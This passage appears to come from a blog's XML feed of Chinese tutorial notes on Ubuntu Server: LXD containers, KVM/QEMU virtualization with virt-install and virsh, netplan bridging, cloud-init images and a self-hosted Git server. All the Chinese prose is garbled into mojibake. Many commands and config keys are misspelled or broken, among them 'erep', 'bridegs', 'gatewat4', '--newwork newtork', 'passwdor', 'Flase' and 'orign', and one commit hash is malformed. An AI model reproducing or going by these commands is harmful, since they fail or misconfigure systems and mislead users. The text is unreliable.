åªä¸‹è½½æ˜ åƒåˆ°æœ¬åœ°ï¼Œä¸åˆ›å»ºå®¹å™¨ lxc image copy ubuntu-daily:18.10 local: --alias u1910 lxc image list # æŸ¥çœ‹æœ¬åœ°çš„æ˜ åƒ # ä»æœ¬åœ°æ˜ åƒæ¥åˆ›å»ºå®¹å™¨ lxc launch u1910 c03 # æŸ¥çœ‹æœ¬åœ°å®¹å™¨ lxc list å¯¹å®¹å™¨è¿›è¡Œä¸Šä¼ ä¸‹è½½æ–‡ä»¶ # ç›´æ¥åœ¨å®¿ä¸»æœºå™¨ä¸Šæ‰§è¡Œ lxc file pull c01/etc/hosts . # æŠŠæ–‡ä»¶ä¸‹è½½åˆ°å½“å‰ç›®å½• lxc file push hosts c01/tmp/ # ä¸Šä¼ æ–‡ä»¶åˆ°å®¹å™¨ä¸­è·¯å¾„ # å½“ç„¶ï¼Œä¹Ÿå¯ä»¥è¿›å…¥äº¤äº’shellå¤åˆ¶ lxc exec C01 bash æ˜ åƒè‡ªåŠ¨æ›´æ–°é—´éš”(å°æ—¶) # æ¯éš”24å°æ—¶è‡ªåŠ¨æ›´æ–°æ˜ åƒ lxc config set images.auto_update_interval 24 è‡ªåŠ¨æ¸…é™¤æœªä½¿ç”¨çš„æ˜ åƒ(å¤©æ•°) lxc config ser images.remote_cache_expiry 5 æŸ¥çœ‹é…ç½® lxc config show å®ä¾‹ # å®‰è£…apache2 lxc exec c01 bash apt update &amp;&amp; apt install apache2 ip addr show curl 1.1.1.1 å¤–éƒ¨ç½‘ç»œå¯¹å®¹å™¨å†…éƒ¨è®¿é—® - é˜²ç«å¢™è§„åˆ™è·¯ç”±æµé‡ - åˆ›å»ºé…ç½®æˆ‘å‘¢è§DHCP è·å–ç‰©ç†ç½‘ç»œåœ°å€(ç±»ä¼¼VM) - å®¿ä¸»æœºåˆ›å»ºæ¡¥æ¥ç½‘å¡ br0 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>å®¹å™¨</tag>
        <tag>Docker</tag>
        <tag>LXD</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-è™šæ‹ŸåŒ–]]></title>
    <url>%2Fposts%2F64674%2F</url>
    <content type="text"><![CDATA[äº‘è®¡ç®— èµ„æºå°±åƒæ°´é¾™å¤´é‡Œçš„æ°´ï¼ŒæŒ‰éœ€ç´¢å– ä¿¡æ¯æ—¶ä»£è®¡ç®—èµ„æºæ˜¯æœ€ä¸»è¦çš„ç”Ÿäº§åŠ› ä¸»æœºæ—¶ä»£ã€ç½‘ç»œæ—¶ä»£ é›†ä¸­å’Œåˆ†æ•£ã€ä¸‰åå¹´æ²³ä¸œä¸‰åå¹´æ²³è¥¿ é‡å­è®¡ç®—å¯èƒ½é¢ è¦†ä¸€åˆ‡ è®¡ç®—èµ„æºçš„äº‘åŒ– æŒ‰éœ€è°ƒåº¦ã€æŒ‰éœ€ç´¢å– è®¡ç®—èµ„æºéœ€è¦æ›´å¤§ç¨‹åº¦çš„é¢—ç²’åº¦ç»†åŒ– è™šæ‹ŸåŒ–æ˜¯è®¡ç®—èµ„æºç»†åˆ†çš„åŸºç¡€ å¤„ç†å™¨è¿ç®—èƒ½åŠ›çš„å¤§å¹…æå‡ å¤„ç†é€Ÿåº¦æœˆæ¥è¶Šå¿«ï¼ˆæ‘©å°”å®šå¾‹ï¼‰ å¤šæ ¸å¤„ç†å™¨æ¶æ„ å¤§é‡è®¡ç®—èµ„æºé™åˆ¶æµªè´¹ï¼Œä¼ä¸šæ•´ä½“è¿è¡Œæˆæœ¬é«˜ å¤šåº”ç”¨åŒæœºéƒ¨ç½²ï¼Œåº”ç”¨éš”ç¦»å·®ï¼Œç¨³å®šæ€§å½±å“å¤§ å¤„ç†å™¨æ”¯æŒè™šæ‹ŸåŒ–æŠ€æœ¯ åˆ†ç±»1.Saasï¼š Software as a Service # è½¯ä»¶å³æœåŠ¡ï¼Œ æœåŠ¡ä»¥è½¯ä»¶å½¢å¼äº¤ä»˜ Gmail / Google Docs / åœ¨çº¿Office / Office 365 ... æ— éœ€æœ¬åœ°å®‰è£…éƒ¨ç½² 2.PaaSï¼š Platform as a Service # å¹³å°å³æœåŠ¡ æä¾›è½¯ä»¶å¼€å‘è¿è¡Œçš„åŸºç¡€å¹³å° APIã€Google App Engine 3.IaaSï¼š Infrastructure as a Service # åŸºç¡€æ¶æ„å³æœåŠ¡ æœ€åº•å±‚çš„æ™•è®¡ç®—ï¼Œç‰©ç†çš„è®¡ç®—ã€å­˜å‚¨ã€ç½‘ç»œèµ„æºé¥­å„ä½ä½  AWSã€Google Computer Engineã€ é˜¿é‡Œäº‘ äº‘è®¡ç®—æ˜¯å°†èµ„æºæ‰“ç¢ã€åˆ†é…ã€å‘å¸ƒã€äº¤ä»˜çš„ä¸€ç»„å·¥å…·çš„åˆé›† Hypervisors -&gt; ä½¿å¾—è™šæ‹ŸæœåŠ¡å™¨çš„æ€§èƒ½ä¸ä¾èµ–ç‰©ç†æœºï¼Œå’Œç‰©ç†æœºæ˜¯å¹³è¡Œçš„ï¼Œå¯ä»¥ç›´æ¥è®¿é—®ç‰©ç†çš„CPU # å¸¸è§çš„è™šæ‹ŸåŒ–è½¯ä»¶ KVMã€XEN(ç›®å‰éƒ¨ç½²æ–¹å¼æ˜¯å®Œæ•´çš„å…‰ç›˜)ã€QEMUã€Virtualboxã€VMWare # æœ¬ç« ä¸»è¦å­¦è¿™ä¸¤ä¸ªï¼šKVMã€EMU äº‘è®¡ç®—å¹³å° # ubuntuä¸Šæœ€å…¸å‹çš„ Openstack æœåŠ¡ç¼–æ’å·¥å…· # å…¸å‹çš„ Juju æœºå™¨é…ç½®å·¥å…· MAAS è™šæ‹ŸåŒ– ç‰©ç†æœåŠ¡å™¨ï¼Œéƒ¨ç½²è™šæ‹ŸåŒ–å¹³å°ï¼Œåˆ›å»ºå¤šä¸ªè™šæ‹Ÿæœºï¼Œæ¯ä¸ªè™šæ‹Ÿæœºä½¿ç”¨ç‰©ç†æœºçš„è®¡ç®—é‡ã€‚è™šæ‹ŸåŒ–æ˜¯äº‘è®¡ç®—çš„åŸºç¡€ é™ä½æˆæœ¬ï¼Œæé«˜åˆ©ç”¨ç‡ï¼Œæ–¹ä¾¿ç®¡ç†éƒ¨ç½²ï¼Œå¿«é€Ÿæ¢å¤è¿˜åŸ æ™®éç”¨äºå¼€å‘æµ‹è¯•å®éªŒã€ç”Ÿäº§ç¯å¢ƒéƒ¨ç½²éƒ½å¯ éœ€è¦ç¡¬ä»¶æ”¯æŒ(BIOSè®¾ç½®å¼€å¯) CPUç‰¹æ€§ Hypervision KVMKernel-based Virtual Machineï¼ˆKVMï¼‰ åŸºäºå†…æ ¸çš„è™šæ‹Ÿæœº(KVM)å’Œå¿«é€Ÿä»¿çœŸå™¨(QEMU)ç»„æˆçš„è™šæ‹ŸåŒ–å¥—ä»¶( QEMU/KVM ) QEMU/KVMåœ¨æ²¡æœ‰ç¡¬ä»¶è™šæ‹ŸåŒ–æ”¯æŒä¸‹ï¼Œè™šæ‹Ÿæœºéœ€è¦è¿è¡Œåœ¨QEMUæ¨¡æ‹Ÿå™¨ä¸­ æœ‰ç¡¬ä»¶è™šæ‹ŸåŒ–æ”¯æŒä¸‹ï¼Œæ¥è¿‘ç¡¬ä»¶ç‰©ç†æœºé€Ÿåº¦è¿è¡Œ è™šæ‹ŸåŒ–æ‰©å±•å†³å®šæ€§èƒ½( virtualization extensions ) Ubuntué»˜è®¤å†…å»ºæ”¯æŒçš„è™šæ‹ŸåŒ–æ–¹æ¡ˆ å†…å»ºäºLinuxå†…æ ¸( Intel çš„kvm-intel.koæˆ–AMDçš„kvm-amd.ko ) libvirtåº“æ˜¯Linuxä¸è™šæ‹ŸåŒ–é€šä¿¡çš„ç»Ÿä¸€ æ¥å£ å¤„ç†åœ¨ä¸»æœºå’Œå®¢æˆ·æœºä¹‹é—´åˆ†ç¦»ä»»åŠ¡æ‰€éœ€çš„ä½çº§æŒ‡ä»¤ æ— æ³•å¹¶è¡Œè¿è¡ŒVirtualBoxå’ŒKVMè™›æ‹Ÿæœºï¼Œå®ƒä»¬ä¼šæŠ¢å CPUçš„è™šæ‹ŸåŒ–åŠŸèƒ½ æŠŠKVMå’ŒQEMUç»“åˆåœ¨ä¸€èµ·é€šè¿‡libvirtåº“å®ç°Linuxä¸è™šæ‹ŸåŒ–é€šä¿¡çš„æ¥å£ éªŒè¯ç¡¬ä»¶å¹³å°æ”¯æŒè™šæ‹ŸåŒ–æ‹“å±•(è¾ƒæ–°çš„ç¡¬ä»¶å…¨éƒ¨æ”¯æŒ)å››ç§æ–¹æ³• # F1 egrep -c '(vmx|svm)' /proc/cpuinfo # ç»“æœä¸ä¸º0å³æ”¯æŒ erep -E 'vmx|svm' /proc/cpuinfo # ç»“æœä¸ä¸º0å³æ”¯æŒ # F2 kvm-ok # sudo apt install cpu-checker # F3 lscpu # æ‰¾ä¸‹åˆ—å­—æ®µï¼š # Virtualization: VT-x # Flags: vmx # F4 sudo virt-host-validate # sudo apt install libvirt-client # Checking for hardware virtualizatin: PASS å¯ä»¥åœ¨virtualboxæˆ–vmwareè™šæ‹Ÿæœºé‡Œé¢å®‰è£…kvmçš„è™šæ‹Ÿæœº KVMå®‰è£…å’Œä½¿ç”¨å®‰è£…æœåŠ¡ç«¯ç»„ä»¶# bridge-utilsæ¡¥æ¥çš„é˜²æ­¢ï¼Œç”¨æ¥åšåœ°å€è½¬æ¢çš„ sudo apt install bridge-utils libvirt-bin qemu-kvm qemu-system # å½“å‰ç”¨æˆ·ä¼šè¢«åŠ å…¥livirtç»„ # éœ€è¦é‡å¯ç³»ç»Ÿä½¿å¾—æƒé™ç”Ÿæ•ˆ # æ˜ åƒæ–‡ä»¶ç›®å½•(ä»¥åçš„è™šæ‹Ÿæœºæ–‡ä»¶éƒ½ä¼šæ”¾åœ¨è¿™é‡Œ) /var/lib/libcirt/images # é…ç½®æ–‡ä»¶ /etc/libvirt/libvirtd.conf æƒé™(è¯»å†™,ç®¡ç†)çš„ä¿®æ”¹ï¼ŒåŠ å¯†è¯ä¹¦ç­‰ã€‚ä¸€èˆ¬ä¸éœ€è¦é…ç½®ã€‚ å®‰è£…å®¢æˆ·ç«¯ç»„ä»¶1.å›¾å½¢åŒ–çš„å®¢æˆ·ç«¯ç®¡ç†å·¥å…·# 1.å›¾å½¢åŒ–çš„ç®¡ç†å·¥å…·(virt-manager)ï¼Œssh-askpassæ˜¯ç”¨æ¥sshè¿æ¥è¿œç¨‹ä¸»æœºä½¿ç”¨çš„ sudo apt install virt-manager ssh-askpass # å®¢æˆ·ç«¯çš„ä½¿ç”¨ å¯ä»¥æ–°å»ºè¿æ¥ï¼šé€‰æ‹©è¿æ¥å“ªä¸ªæœºå™¨(æœ¬æœºã€è¿œç¨‹æœºå™¨)çš„kvmåå° åˆ›å»ºè™šæ‹Ÿæœº:è·Ÿvirtualboxçš„å°±ç±»ä¼¼äº†ï¼ŒAdd PoolæŒ‡å®šisoæ–‡ä»¶çš„è·¯å¾„æ¥æŒ‚è½½å¯»æ‰¾ # 2.ä¹Ÿæœ‰å­—ç¬¦ç•Œé¢çš„å®¢æˆ·ç«¯ç®¡ç†å·¥å…· ç½‘å¡æ¡¥æ¥é…ç½®é»˜è®¤è™šæ‹Ÿæœºç½‘ç»œæ¨¡å¼ä¸ºNATï¼ˆå¯ä»¥è®¿é—®å¤–éƒ¨ç½‘ç»œï¼Œä½†å¤–éƒ¨è®¡ç®—æœºæ— æ³•è®¿é—®è™šæ‹Ÿæœºï¼‰ï¼Œå¯ä»¥ä½¿ç”¨ç½‘æ¡¥å®ç°VMè¢«å¤–éƒ¨ç½‘ç»œè®¿é—® ç½‘æ¡¥çš„é…ç½® # sudo vim /etc/netplan/50-cloud-init.yaml # æ–°å¢é…ç½® ethernets: ens33: dhcp4: no # è¿™ä¸ªåˆ†ç»™ç½‘æ¡¥ï¼Œæ‰€ä»¥è¿™ä¸ªç‰©ç†ç½‘å¡ä¸èƒ½æœ‰ipåœ°å€ dhcp6: no bridegs: # é…ç½®ç½‘æ¡¥ br0: interfaces: [ens33] dhcp4: no addresses: [172.16.24.13/24] gatewat4: 172.16.24.1 nameservers: addresses: [8.8.8.8,8.8.4.4] # è®©é…ç½®ç”Ÿæ•ˆ sudo netplan apply è™šæ‹Ÿæœºé…ç½®ï¼šé€‰æ‹©è™šæ‹Ÿæœºï¼Œé€‰æ‹©ç¬¬äºŒä¸ªçª—å£ï¼Œé€‰æ‹©ç½‘å¡ï¼ŒBridgeæ¨¡å¼ï¼Œé€‰æ‹©è®¾å¤‡ï¼Œå¯åŠ¨è™šæ‹Ÿæœº å»ºç«‹è¿æ¥ virt-manager æœ¬æœº/ ç½‘ç»œ è¿æ¥ virt-manager åŸºæœ¬ä½¿ç”¨ å…‹éš†åˆ›å»ºè™šæ‹Ÿæœº KVMä¸æ”¯æŒæ¨¡æ¿åŠŸèƒ½ï¼Œä½†å¯å°†è™šæ‹Ÿæœºå…³æœºä½œä¸ºæ¨¡æ¿ä½¿ç”¨(å³é”®ï¼Œclone, åŸºäºå®ƒä½œä¸º"æ¨¡æ¿") # åˆ›å»ºè™šæ‹Ÿæœºå¿«ï¼Œå èµ„æºå°‘ è™šæ‹Ÿæœºç®¡ç†æ§åˆ¶å°ï¼ˆæœ‰å¾ˆå¤šå¥½ç”¨çš„åŠŸèƒ½ï¼‰ è¿ç§»(Migrate) â€“&gt; æŠŠæŸå®¿ä¸»æœºä¸Š(å‡ºç°æ•…éšœäº†)æŸå°è™šæ‹Ÿæœºè¿ç§»åˆ°å¦ä¸€å°å®‰è£…äº†kvmæœåŠ¡çš„æœåŠ¡å™¨ä¸Š 2.å‘½ä»¤è¡Œå®¢æˆ·ç«¯ å‘½ä»¤è¡Œæ–¹ä¾¿å†™è„šæœ¬ï¼ŒÂ·æ‰¹é‡è¿›è¡Œå¾ˆå¤šè™šæ‹Ÿæœºçš„å®‰è£…å’Œç®¡ç† åˆ›å»ºè™šæ‹Ÿæœº # å‘½ä»¤è¡Œåˆ›å»ºè™šæ‹Ÿæœº virt-install sudo virt-install -n web1 -r 2048 --disk path=/var/lib/libcire/images/web1.img,bus=virtio,size=10 -c ubuntu-18.04-server-amd64.iso --newwork newtork=default,model=virtio --graphics vnc, listen=0.0.0.0 --noautoconsele -v # --disk path è™šæ‹Ÿæœºé•œåƒæ–‡ä»¶å­˜æ”¾è·¯å¾„ # size=4 ç¡¬ç›˜æ–‡ä»¶å¤§å°4G # bus=virtio æ€»çº¿ç±»å‹ # -c CDROMï¼ˆisoæ–‡ä»¶ã€ç‰©ç†å…‰é©±ï¼‰ # --newwork newtork=defaultï¼Œmodel=virtio æ¥å£æ¨¡å¼ # --graphics vnc, listen=0.0.0.0 VNCæ§åˆ¶æ¥å£ # --noautoconsele ä¸è‡ªåŠ¨è¿æ¥è™šæ‹Ÿæœºæ§åˆ¶å° å¤åˆ¶è™šæ‹Ÿæœº sudo virt-clone -o win10 -n win10-2 -f /var/lib/libcire/images/win10-2.img # -o åŸå§‹è™šæ‹Ÿæœº # -n æ–°å»ºè™šæ‹Ÿæœº # -f è™šæ‹Ÿæœºé•œåƒæ–‡ä»¶å­˜æ”¾è·¯å¾„ å»ºç«‹è¿æ¥ virsh connect qemu:///192.168.0.12 æŸ¥çœ‹vmæœåŠ¡å™¨ä¸Šæ‰€æœ‰VM # æŸ¥çœ‹runçš„ virsh list # æŸ¥çœ‹æ‰€æœ‰çŠ¶æ€çš„ virsh list --all ç®¡ç†VM virsh console centos_01 å…³é—­å½“å‰console ctrl + ] æ­£å¸¸å…³æœº virsh shutdown centos_01 å¼ºåˆ¶å…³æœº virsh destory centos_01 åˆ é™¤è™šæ‹Ÿæœº virsh undefine centos_01 æŒ‚èµ·VM virsh suspend centos_01 æ¢å¤ä½¿ç”¨VM virsh resume centos_01 ä½¿ç”¨äº‘å¹³å°ä¸‹è½½é€‚åˆä¸åŒç¯å¢ƒçš„é•œåƒ: https://cloud-images.ubuntu.com/releases/bionic/release wget /ubuntu-18.04-server-cloudimg-amd64.img -O u18.img.dist è§£å‹ä¸‹è½½çš„é•œåƒæ–‡ä»¶ qemu-img convert -O qcow2 u18.img.dist u18.img # ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œå¯ä»¥ç†è§£è¿™ä¸ªä¸ºä¸€ä¸ªæ¨¡æ¿ åˆ›å»ºç”¨æˆ·æ•°æ®æ–‡ä»¶ vim cloud-config # cloud-config passwdor: 123465 chpasswd: { expire: Flase } # å¯†ç ä¸è¿‡æœŸ ssh_pwauth: True # å…è®¸sshèº«ä»½è®¤è¯ ç”Ÿæˆç”¨æˆ·æ•°æ®ç›˜ # åŸºäºæ¨¡æ¿åˆ›å»ºä¸€ä¸ªæ–°çš„æ•°æ®ç›˜ cloud-localds user-data.img cloud-config # ä½¿ç”¨ä¸Šé¢çš„é…ç½®æ–‡ä»¶ å¯åŠ¨è™šæ‹Ÿæœº kvm -m 2048 -smp 2 -hda u18.img -hdb user-data.img -net nic -net user,hostfwd=tcp::1810-:22 -nographic # å¸å·å¯†ç : ubuntu / 123465(ä¸Šé¢é…ç½®æ–‡ä»¶æŒ‡å®šçš„) sudo passwd ubuntu # ä¿®æ”¹å¯†ç  åˆ é™¤äº‘é•œåƒåˆå§‹åŒ–è„šæœ¬ sudo apt-get remove cloud-init ä½¿ç”¨äº‘é•œåƒåˆ›å»ºVM éƒ¨ç½²å®Œä¸€ä¸ªä¹‹åï¼Œå°±å¯ä»¥åŸºäºç¬¬ä¸€ä¸ªè¿›è¡Œclone document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
        <tag>KVM</tag>
        <tag>è™šæ‹ŸåŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-ç‰ˆæœ¬æ§åˆ¶]]></title>
    <url>%2Fposts%2F52930%2F</url>
    <content type="text"><![CDATA[107-ç‰ˆæœ¬æ§åˆ¶æ¦‚è¿°ç®€ä»‹version control systemï¼ˆç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼‰revision control system (ä¿®è®¢æ§åˆ¶ç³»ç»Ÿ) å¼€å‘å·¥å…·ï¼Œä½†ä¸ä»…é™äºæºç æ–‡ä»¶ è®°å½•æ–‡ä»¶çš„æ¯æ¬¡å˜æ›´ éšæ—¶å¯ä»¥å›åˆ°å†å²çŠ¶æ€ æ–‡ä»¶ä»¥åŠå…ƒæ•°æ®çš„å˜æ›´ï¼ˆä¿®æ”¹äººã€ä¿®æ”¹ç†ç”±ã€å…·ä½“ä¿®æ”¹å†…å®¹ã€æ—¶é—´æˆ³ï¼‰ é…ç½®æ–‡ä»¶æ˜¯é™¤æ•°æ®ä¹‹å¤–ç¬¬äºŒå¤§èµ„äº§ å›¢é˜Ÿå†™ä½œ åˆ†ç±» Centralized version control systems (SVCS) é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶ é›†ä¸­å­˜å‚¨ä¿®æ”¹ï¼Œé¢—ç²’æ§åˆ¶ç»†ï¼Œä½†æ˜¯å•ç‚¹æ•…éšœéšæ‚£ CSV / Subersion distributed version control systems (DVCS) åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ åˆ†å¸ƒå¼å­˜å‚¨åº“çš„å®Œæ•´æ‹·è´ Git / Mercurial / Bazaar(Ubuntuå®˜æ–¹åœ¨å¼€å‘æ—¶å€™ä½¿ç”¨çš„) æ¯ä¸ªäººç»´æŠ¤æœ¬åœ°åº“ï¼Œå®Œæˆåä¸Šä¼ åˆ°æœåŠ¡å™¨ æŒ‡é’ˆæŒ‡å‘å½“å‰æœ€æ–°ç‰ˆæœ¬éšç€å›æ»šè¿˜åŸå†å²ç‰ˆæœ¬ Git æœ€åˆç”±Linuxå†…æ ¸åˆ›å§‹äººå¼€å‘ Gitä½œä¸ºå¼€å‘å·¥å…·è€Œç”Ÿ é€‚åˆå¤§å‹é¡¹ç›®çš„ç‰ˆæœ¬ç®¡ç† Gitåº“ä¿å­˜æ‰€æœ‰ç¨‹åºå‘˜çš„å›¢é˜Ÿæˆæœ Gité»˜è®¤ä½¿ç”¨OpenSSH æœåŠ¡å™¨ä¸Šçš„Gitç”¨æˆ·éœ€è¦èƒ½å¤Ÿä¿®æ”¹ç›®å½•(åº“) ä¸€ä¸ªåº“å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶å¤¹(åº“é…ç½®ä¿¡æ¯: .gitç›®å½•) æ— éœ€ç‹¬ç«‹çš„ä¸“èŒæœåŠ¡å™¨ï¼Œæ»¡è¶³å­˜å‚¨ç©ºé—´éœ€æ±‚å¯å…±ç”¨ githubç›®å‰ä¸–ç•Œä¸Šæœ€å¤§çš„ä»£ç æ‰˜ç®¡æœåŠ¡å•†ï¼ˆå·²è¢«å¾®è½¯æ”¶è´­ï¼‰ æœåŠ¡ç«¯å®‰è£… # 1. ubuntuè‡ªå¸¦çš„(å’Œgitè‡ªå¸¦çš„ç‰ˆæœ¬ä¸ä¸€æ ·,ä¸æ˜¯æœ€æ–°çš„) # sudo -s æŠŠè‡ªå·±æå‡æˆrootæƒé™ï¼Œåé¢å°±ä¸ç”¨è¾“å…¥sudoäº† apt install git mkdir /git # åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹(åç»­ä½œä¸ºä¸€äº›gitåº“çš„å­˜æ”¾ä½ç½®) chown xps:xps /git cd /git git init --bare apache2 # åˆ›å»ºä¸€ä¸ªè£¸åº“,åå­—å«apache2ï¼ˆç©ºçš„æ¡†æ¶åº“ï¼Œä¸å­˜åœ¨æ•°æ®ï¼‰ /var/log/auth.log # sshç™»å½•é—®é¢˜è¯Šæ–­ # 2.ä½¿ç”¨ppaåº“æ–¹å¼å®‰è£… sudo add-apt-repository ppa:git-core/ppa sudo apt update sudo apt install git git version # ç‰ˆæœ¬æ¯”ubuntuåº“ä¸­çš„æ–° ç„¶åå’Œä¸Šé¢ä¸€æ ·åˆ›å»ºå­˜æ”¾gitåº“çš„ç›®å½• å®¢æˆ·ç«¯ä½¿ç”¨ # å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯éƒ½æ˜¯å®‰è£…çš„åŒä¸€ä¸ªgitè½¯ä»¶åŒ… # å…¶å®å®¢æˆ·ç«¯æœ¬èº«ä¹Ÿå¯ä»¥ä½œä¸ºä¸€ä¸ªæœ¬åœ°çš„gitæœåŠ¡å™¨ # åŸºæœ¬é…ç½® git config --global user.name "Your Name" git config --global user.email "eamail@domain.com" git config --list # æŸ¥çœ‹é…ç½®ä¿¡æ¯ git help # æŸ¥çœ‹å¸¸ç”¨çš„gitäºŒçº§å‘½ä»¤ git help -a # æŸ¥çœ‹æ‰€æœ‰çš„å­å‘½ä»¤ git help -g # æŸ¥çœ‹æ‰€æœ‰çš„å­å‘½ä»¤, å¹¶æœ‰æè¿° git help everyday # man giteveryday æŸ¥çœ‹å…·ä½“æŸä¸€ä¸ªå­å‘½ä»¤çš„ç”¨æ³• gitå®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨ mkdir /git # åŒæ ·åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ chown xps:xps /git cd /git # ä½œä¸ºå®¢æˆ·ç«¯ï¼Œä»è¿œç¨‹æœåŠ¡ç«¯cloneåº“(æ˜¯æœåŠ¡ç«¯çš„ç»å¯¹è·¯å¾„) git clone xps@192.168.0.105:/git/web # .gitç›®å½•å­˜æ”¾é…ç½®ä¿¡æ¯(ä½¿ä¹‹æˆä¸ºgitåº“)ï¼Œåˆ é™¤æ­¤ç›®å½•å°±æ˜¯ä¸€ä¸ªæ™®é€šæ–‡ä»¶å¤¹ # å…¶ä¸­configæ–‡ä»¶åŒ…å«è¿œç¨‹æœåŠ¡å™¨åœ°å€ä¿¡æ¯(å†™å¥½ä¹‹åä»¥åå°±ä¸ç”¨æ‰‹åŠ¨è¾“å…¥ä¿¡æ¯ï¼›) [core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true [remote "origin"] url = xps@192.168.0.105:/git/web fetch = +refs/heads/*:refs/remotes/origin/* [branch "master"] remote = origin merge = refs/heads/master å¸¸ç”¨gitå‘½ä»¤# æŸ¥çœ‹çŠ¶æ€ git status # è¿½åŠ å˜æ›´åˆ°gitçš„è¿½è¸ª git add . # æ‰€æœ‰æ–‡ä»¶ git add file_name # æŒ‡å®šæ–‡ä»¶ # æäº¤å˜æ›´ç»™æœ¬åœ°gitåº“ git commit -a -m "ç¬¬ä¸€æ¬¡æäº¤" # åŒæ­¥åˆ°æœåŠ¡å™¨ï¼ˆorignç­‰åœ¨configæ–‡ä»¶å·²ç»å†™å¥½äº†ï¼‰ # æäº¤ä¹‹å‰å¿…é¡»æœåŠ¡å™¨çš„å†…å®¹æ˜¯æœ€æ–°çš„ç‰ˆæœ¬ï¼Œå…ˆgit pull, å†push git push orign master # ä»æœåŠ¡å™¨æ›´æ–° git pull # æœåŠ¡ç«¯æ•°æ®å­˜å‚¨ç»“æ„ä¸å®¢æˆ·ç«¯ä¸åŒ(æ•°æ®åº“) # æ’¤é”€æ–‡ä»¶çš„å˜æ›´(ä¸ä»…ä»…å¯¹æ–‡ä»¶ï¼Œå¯¹ç‰ˆæœ¬ä¹Ÿå¯æ’¤é”€) git checkout &lt;file> # å›é€€æœ€è¿‘çš„ç‰ˆæœ¬ # æ¯”å¯¹æ¥æŸ¥çœ‹æ–‡ä»¶çš„ä¿®æ”¹å˜åŒ– git diff index.html # å†…å®¹(å¯¹æ¯”çš„ä¸¤ä¸ªæ–‡ä»¶) --- a/4.conf +++ b/4.conf ########### åˆ‡å›å†å²ä¸Šä»»ä½•ä¸€ä¸ªç‰ˆæœ¬ apt install tig # æ–¹æ³•å¾ˆå¤šï¼Œè¿™é‡Œä½¿ç”¨äº†tig tig # ç›´æ¥æŸ¥çœ‹å†å²ç‰ˆæœ¬(ç§»åŠ¨åˆ°ç‰ˆæœ¬ä¸Šï¼Œä¸‹é¢ä¼šæœ‰ç‰ˆæœ¬å·hashå€¼)ï¼Œå›è½¦ä¼šçœ‹åˆ°å…·ä½“å˜æ›´å†…å®¹ git checkout ddwe23e353c0d6665406e7c07djaoid2d # åˆ‡å›åˆ°æŒ‡å®šç‰ˆæœ¬ # åªæ˜¯æŒ‡é’ˆä¸´æ—¶æŒ‡å‘äº†ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œæ²¡æ˜¾ç¤ºåé¢çš„ç‰ˆæœ¬(ä½†æ˜¯åé¢çš„ç‰ˆæœ¬è¿˜æ˜¯å­˜åœ¨çš„) # å¦‚æœéªŒè¯æ²¡é—®é¢˜ï¼Œå…ˆå›åˆ°æœ€æ–°çŠ¶æ€ git checkout master # å›æ»š(åªæ˜¯å›æ»šé‚£ä¸€ä¸ªç‰ˆæœ¬çš„æ‰€åšçš„å˜æ›´, ä¸æ˜¯å›é€€åˆ°é‚£ï¼Œä¹Ÿä¸å½±å“ä¹‹åçš„ç‰ˆæœ¬) --> ä»å½“å‰æœ€æ–°ç‰ˆæœ¬çš„åŸºç¡€å±±ï¼Œå»æ‰å‰é¢æŸä¸€ä¸ªç‰ˆæœ¬ä¸­æ‰€åšçš„å˜æ›´ git revert master ddwe23e353c0d6665406e7c07djaoid2d ä¸ä»…ä»…çš„å¯¹ä»£ç ï¼Œå¯¹é…ç½®æ–‡ä»¶ä¹Ÿå¯ä»¥æ˜¯ä¸ªå¥½ä¹ æƒ¯ # ä¾‹å­ :apacheçš„é…ç½®æ–‡ä»¶ cp -rp /etc/apache2 /etc/apache2.bak mv /etc/apache2/* /git/apache2 rm /etc/apache2 # è¿™é‡Œåƒä¸‡ä¸èƒ½é‡å¯ find /git/apache2 -name '.?*' -prune -o -exec chown root:root {} + # æ’é™¤.git(.?*)ï¼Œå…¶ä»–çš„éƒ½æ”¹ä¸ºroot ln -s /git/apache2 /etc/apache2 # åšä¸ªè½¯é“¾æ¥(å¯ä»¥è®©åº”ç”¨è¯»å–åˆ°é…ç½®æ–‡ä»¶) systemctl reload apache2 # ä»¥åä¿®æ”¹å°±åœ¨gitä»“åº“ä¿®æ”¹ï¼Œå¹¶è¿›è¡Œaddå’Œcommitå’Œpushï¼Œä»¥ä¾¿å‡ºé—®é¢˜å›æ»š Github å¼€æºé¡¹ç›®å¯ä»¥ä½¿ç”¨ï¼Œå‰é¢è‡ªå·±åœ¨æœåŠ¡å™¨æ­å»ºçš„gitæœåŠ¡å™¨å¯ä»¥è‡ªå·±å…¬å¸ç”¨(å•†ç”¨çš„è‚¯å®šè¦è‡ªå·±å†…éƒ¨å»ºç‰ˆæœ¬æ§åˆ¶æœåŠ¡å™¨)æœºå¯†&amp;éšç§ä¿¡æ¯ä¸å»ºè®®æ”¾åˆ°å¼€æºå¹³å° åˆ›å»ºå¹¶åŒæ­¥æ–°åº“ ## 